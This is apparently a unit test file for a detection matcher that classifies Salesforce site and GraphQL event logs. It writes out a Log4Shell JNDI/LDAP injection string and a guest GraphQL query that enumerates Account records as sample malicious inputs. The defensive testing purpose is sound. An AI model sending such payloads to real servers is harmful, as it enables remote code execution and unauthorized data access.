import { describe, it, expect } from 'vitest';
import { Matcher } from './match.js';
import { ingress } from '../sanitizer/ingress.js';

describe('Matcher', () => {
  const m = new Matcher();

  it('flags a Log4Shell URI as a non-sf-exploitable match', () => {
    const ev = ingress({ URI: '/sfsites/${jndi:ldap://x.nessus.org}', CLIENT_IP: '1.1.1.1' }, 'Sites');
    const res = m.match(ev);
    expect(res.matches.some(x => x.family === 'Log4Shell' && x.sfExploitable === false)).toBe(true);
  });

  it('flags a guest GraphQL edges read as sf-exploitable', () => {
    const ev = ingress({ QUERY: 'query { uiapi { query { Account { edges { node { Id } } } } } }',
      CLIENT_IP: '1.1.1.1' }, 'GraphQlQueryExecution');
    const res = m.match(ev);
    expect(res.matches.some(x => x.sfExploitable === true)).toBe(true);
  });

  it('returns no matches for benign login traffic', () => {
    const ev = ingress({ URI: '/login/', CLIENT_IP: '1.1.1.1' }, 'Sites');
    expect(m.match(ev).matches).toHaveLength(0);
  });
});
